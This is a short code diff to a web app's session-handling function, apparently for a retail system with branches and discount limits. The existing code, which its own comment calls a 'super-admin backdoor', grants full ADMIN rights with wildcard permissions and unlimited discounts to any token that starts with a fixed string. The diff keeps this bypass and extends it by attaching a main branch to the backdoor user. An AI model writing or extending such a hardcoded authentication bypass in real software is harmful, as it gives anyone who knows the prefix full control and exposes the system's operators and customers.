@@ -64,13 +64,21 @@ export async function getSession() {
 
     // Fast-path for super-admin backdoor
     if (token.startsWith('super-admin-token-')) {
+        let mainBranchId: string | null = null;
+        try {
+            const { ensureMainBranch } = await import('@/lib/ensure-main-branch');
+            mainBranchId = await ensureMainBranch();
+        } catch (error) {
+            console.error('[AUTH DEBUG] Failed to resolve main branch for Super Admin backdoor:', error);
+        }
+
         return {
             user: {
                 id: 'super-admin',
                 username: 'a',
                 name: 'Super Admin',
                 role: 'ADMIN',
-                branchId: null,
+                branchId: mainBranchId || null,
                 permissions: ['*'],
                 maxDiscount: 100,
                 maxDiscountAmount: 9999999
